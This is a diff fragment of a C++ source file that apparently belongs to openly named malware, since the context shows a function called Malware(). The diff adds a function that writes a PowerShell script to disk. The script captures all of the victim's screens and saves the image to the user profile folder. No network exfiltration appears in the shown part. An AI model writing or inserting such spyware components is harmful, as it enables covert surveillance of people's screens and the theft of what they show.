@@ -129,7 +129,30 @@ void Malware()
     }
   }
 }
+void CreatePrintScreenPS1(string output)
+{
+  ofstream file;
+  string scriptPS1;
 
+  file.open(output+"PrintScreen.ps1");
+
+  scriptPS1 += "Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n";
+  scriptPS1 += "$screens = [Windows.Forms.Screen]::AllScreens\n";
+  scriptPS1 += "$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum\n";
+  scriptPS1 += "$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum\n";
+  scriptPS1 += "$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum\n";
+  scriptPS1 += "$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n";
+  scriptPS1 += "$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n";
+  scriptPS1 += "$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)\n";
+  scriptPS1 += "$graphics = [Drawing.Graphics]::FromImage($bmp)\n";
+  scriptPS1 += "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n";
+  scriptPS1 += "$bmp.Save(\"$env:USERPROFILE\\image.png\")\n";
+  scriptPS1 += "$graphics.Dispose()\n";
+  scriptPS1 += "$bmp.Dispose()";
+
+  file << scriptPS1 << endl;
+  file.close();
+}
 string current_working_directory()
 {
   char* cwd = _getcwd( 0, 0 ) ;
